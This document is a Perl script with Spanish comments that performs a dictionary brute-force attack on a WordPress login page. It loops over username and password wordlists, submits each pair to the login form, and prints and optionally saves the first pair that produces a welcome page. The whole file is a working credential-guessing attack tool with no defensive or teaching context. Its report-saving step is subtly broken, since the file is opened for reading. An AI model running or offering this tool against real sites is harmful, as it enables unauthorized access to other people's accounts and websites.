#!C:/Strawberry/perl/bin/perl.exe
#!/usr/bin/perl

binmode(STDOUT, ":encoding(cp850)"); # usada para mostrar cacteres con tildes, etc.

use strict;
use WWW::Mechanize;

# Parametos para el script
my $url = $ARGV[0];
my $admin = $ARGV[1];
my $password = $ARGV[2];
my $reporte = $ARGV[3];

if (!@ARGV){
    print "wordpress-login.pl <url> <admin> <password> opcional<reporte>";
}
else{
    my $mechanize = WWW::Mechanize->new();
    #url de destino
    $mechanize->get($url);

    #Abrir el diccionario paar admin
    open(ADMIN, "<", $admin) || die ("Error al abrir el diccionario para admin");
    while(<ADMIN>){
        my $adm =$_;
        chomp($adm);
        #Abrir el diccionario para password
        open(PASSWORD, "<", $password) || die("Error al abrir el diccionario para password");
        while(<PASSWORD>){
            chomp($_);
            #Enviar el formulario
            $mechanize->submit_form(form_id=>'loginform', fields=>{log=>$adm, pwd => $_ });
            print "$adm:$_\n";
            my $content = $mechanize->content;
            # Comprabar el contenido
            if($content =~ /Bienvenido/ || $content =~ /Welcome/ ){
            print "\n\n¡¡¡¡Datos de Acceso ¡¡¡ $adm:$_\n\n";
                if($reporte){
                    open(REPORTE, "<", $reporte);
                    print REPORTE "¡¡¡Datos de acceso¡¡¡ $adm:$_";
                    close(REPORTE);
                    print "### Datos guardados en $reporte###\n";
                }
            exit;
            }
        }
        close(PASSWORD);
    }
    close(ADMIN);
}







